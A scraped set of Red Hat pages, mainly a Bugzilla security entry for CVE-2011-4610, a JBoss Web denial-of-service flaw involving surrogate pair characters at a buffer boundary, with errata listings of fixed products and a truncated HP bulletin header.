* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from bugzilla.redhat.com_94e5f49c_20250126_072110.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D767871)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D767871)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D767871)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 767871

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 767871**](show_bug.cgi?id=767871)
(CVE-2011-4610)
- [CVE-2011-4610](https://access.redhat.com/security/cve/CVE-2011-4610) JBoss Web remote denial of service when surrogate pair character is placed at buffer boundary

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2011-4610 JBoss Web remote denial of service when surrogate pair characte...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2011-4610 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [769147](show_bug.cgi?id=769147) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [767873](show_bug.cgi?id=767873) [795277](show_bug.cgi?id=795277) [810065](show_bug.cgi?id=810065) | | TreeView+ | [depends on](buglist.cgi?bug_id=767871&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=767871&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2011-12-15 04:13 UTC by David Jorm | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2023-05-12 22:07 UTC ([History](show_activity.cgi?id=767871)) | | [CC List:](page.cgi?id=fields.html#cclist) | 7 users (show)  dknox jclere jdennis mjc pcheung security-response-team tkimura | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2012-03-07 06:50:31 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2012:0074](https://access.redhat.com/errata/RHSA-2012%3A0074) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:17 UTC | | Red Hat Product Errata | [RHSA-2012:0075](https://access.redhat.com/errata/RHSA-2012%3A0075) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:13 UTC | | Red Hat Product Errata | [RHSA-2012:0076](https://access.redhat.com/errata/RHSA-2012%3A0076) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:06 UTC | | Red Hat Product Errata | [RHSA-2012:0077](https://access.redhat.com/errata/RHSA-2012%3A0077) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:02 UTC | | Red Hat Product Errata | [RHSA-2012:0078](https://access.redhat.com/errata/RHSA-2012%3A0078) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Communications Platform 5.1.3 update | 2012-02-01 04:02:57 UTC | | Red Hat Product Errata | [RHSA-2012:0325](https://access.redhat.com/errata/RHSA-2012%3A0325) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-22 10:10:34 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=767871#c0)  David Jorm    2011-12-15 04:13:51 UTC  ``` JBoss Web will enter into an infinite loop when a surrogate pair character is placed at the boundary of an internal buffer. A remote attacker could exploit this flaw to trigger a denial-of-service attack against a JBoss Web server that is hosting applications with UTF-8 character encoding enabled, or that will include user-supplied UTF-8 strings in a response.   ```  [Comment 7](show_bug.cgi?id=767871#c7)  David Jorm    2012-01-06 05:04:13 UTC  ``` Acknowledgements:  Red Hat would like to thank NTT OSSC for reporting this issue.   ```  [Comment 8](show_bug.cgi?id=767871#c8)  errata-xmlrpc    2012-01-31 23:06:19 UTC  ``` This issue has been addressed in following products:    JBoss Communications Platform 5.1.3  Via RHSA-2012:0078 <https://rhn.redhat.com/errata/RHSA-2012-0078.html>   ```  [Comment 9](show_bug.cgi?id=767871#c9)  errata-xmlrpc    2012-01-31 23:06:47 UTC  ``` This issue has been addressed in following products:     JBoss Enterprise Web Platform 5.1.2  Via RHSA-2012:0077 <https://rhn.redhat.com/errata/RHSA-2012-0077.html>   ```  [Comment 10](show_bug.cgi?id=767871#c10)  errata-xmlrpc    2012-01-31 23:07:09 UTC  ``` This issue has been addressed in following products:    JBEWP 5 for RHEL 6   JBEWP 5 for RHEL 4   JBEWP 5 for RHEL 5  Via RHSA-2012:0076 <https://rhn.redhat.com/errata/RHSA-2012-0076.html>   ```  [Comment 11](show_bug.cgi?id=767871#c11)  errata-xmlrpc    2012-01-31 23:07:29 UTC  ``` This issue has been addressed in following products:    JBoss Enterprise Application Platform 5.1.2  Via RHSA-2012:0075 <https://rhn.redhat.com/errata/RHSA-2012-0075.html>   ```  [Comment 12](show_bug.cgi?id=767871#c12)  errata-xmlrpc    2012-01-31 23:07:55 UTC  ``` This issue has been addressed in following products:    JBEAP 5 for RHEL 6   JBEAP 5 for RHEL 4   JBEAP 5 for RHEL 5  Via RHSA-2012:0074 <https://rhn.redhat.com/errata/RHSA-2012-0074.html>   ```  [Comment 13](show_bug.cgi?id=767871#c13)  errata-xmlrpc    2012-02-22 05:11:26 UTC  ``` This issue has been addressed in following products:  JBoss Enterprise BRMS Platform 5.2.0, JBoss Enterprise Portal Platform 5.2.0 and JBoss Enterprise SOA Platform 5.2.0  Via RHSA-2012:0325 <https://rhn.redhat.com/errata/RHSA-2012-0325.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=767871&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.redhat.com_bd89653a_20250126_072107.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_91952309_20250126_072108.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from marc.info_fad4295f_20250125_074712.html ===

```
[[prev in list](?l=bugtraq&m=136483148411286&w=2)] [[next in list](?l=bugtraq&m=136491526005337&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [security bulletin] HPSBUX02860 SSRT101146 rev.1 - HP-UX Apache Running Tomcat Servlet Engine, Remot
